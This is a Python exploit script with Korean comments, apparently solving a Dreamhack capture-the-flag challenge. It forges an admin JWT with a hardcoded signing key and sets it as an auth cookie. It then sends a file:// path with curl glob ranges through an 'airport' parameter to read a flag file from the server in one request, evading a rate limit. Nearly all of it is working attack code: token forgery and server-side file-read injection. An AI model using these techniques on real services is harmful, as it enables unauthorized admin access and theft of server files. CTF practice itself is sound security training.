import jwt
import requests
import time

# ==========================================
# [설정] 본인의 서버 정보로 변경
# ==========================================
JWT_KEY = 'HaLQpschaZzvqWEiwhQWEadLDFpqaKaUSkGLXFPoLFEsgRWvmj'
TARGET_URL = 'http://host8.dreamhack.games:12480'
# ==========================================

# 1. 관리자 토큰 생성
payload = {'id': 'admin', 'isAdmin': True}
admin_token = jwt.encode(payload, JWT_KEY, algorithm='HS256')
cookies = {'auth': admin_token}

print(f"[*] Admin Token Generated")

# 2. One-Shot Payload
# flag_ 다음에 소문자 4글자가 옴을 알고 있습니다.
# curl은 [a-z] 범위를 지원하므로, 이를 4번 반복하면 aaaa ~ zzzz까지 한 번에 찾습니다.
# 요청은 1번만 전송되므로 Rate Limit에 걸리지 않습니다.
target_path = 'file:///deploy/flag_[a-z][a-z][a-z][a-z].txt'

print(f"[*] Sending One-Shot Payload: {target_path}")
print("[*] Waiting for response... (This might take a second)")

try:
    params = {'airport': target_path}
    res = requests.get(f"{TARGET_URL}/api/metar", cookies=cookies, params=params)
    
    # 결과 출력
    if "Timeout" in res.text:
        print("\n[!] Still Rate Limited! Please wait a few more minutes.")
        print(f"Server message: {res.text}")
    elif len(res.text) > 0:
        print("\n" + "="*20 + " FLAG FOUND " + "="*20)
        print(res.text.strip())
        print("="*52)
    else:
        print("[-] No content returned. Something went wrong.")

except Exception as e:
    print(f"[-] Error: {e}")